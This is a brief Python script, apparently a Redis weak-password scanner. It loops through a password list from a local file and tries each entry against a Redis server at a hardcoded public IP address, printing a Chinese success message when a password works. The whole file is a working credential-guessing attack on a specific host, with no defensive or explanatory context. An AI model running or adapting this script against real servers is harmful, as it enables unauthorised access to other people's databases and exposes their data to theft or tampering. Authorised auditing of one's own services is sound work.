import redis

try:
    with open('./pwd.txt') as pwdFile:
        for pwd in pwdFile:
            pwd = pwd.replace('\n','').replace('\r','')
            try:
                r = redis.Redis(host='129.204.234.135',port=6379,password=pwd)
                r.get('test')
                print(u'[+] 连接成功，存在弱口令：{}'.format(pwd))
            except Exception as e:
                print(e)
except Exception as e:
    pass